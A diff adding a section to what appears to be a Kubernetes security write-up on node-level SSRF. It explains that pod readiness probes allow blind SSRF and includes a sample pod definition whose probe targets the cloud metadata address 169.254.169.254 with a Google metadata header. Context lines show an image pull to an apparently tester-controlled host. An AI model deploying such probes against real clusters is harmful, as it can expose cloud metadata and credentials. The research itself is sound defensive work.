@@ -62,3 +62,28 @@ Failed to pull image "caddy.pwndland.uk/image:test": rpc error: code = Unimpleme
 caddy.pwndland.uk:81/image:test": failed to do request: Head "https://caddy.pwndland.uk:81/v2/image/manifests/test": dial tcp 135.125.75.183:81: connect: connection refused
 ```
 
+### Pod Readiness Probes
+
+Another possible Node SSRF vector comes from pod readiness probes. This was first noted in [this GitHub issue from 2021](https://github.com/kubernetes/kubernetes/issues/99425). Whilst the vector is blind SSRF, it does allow some more flexibility than pod images, in that it allows for headers to be specified and specific paths to be targeted.
+
+From that issue a sample pod definition would look like
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: test
+spec:
+  containers:
+  - image: docker.io/kennethreitz/httpbin
+    name: httpbin
+    readinessProbe:
+      httpGet:
+        host: 169.254.169.254
+        httpHeaders:
+        - name: Metadata-Flavor
+          value: Google
+        path: /computeMetadata/v1/
+        port: 80
+        scheme: HTTP
+```
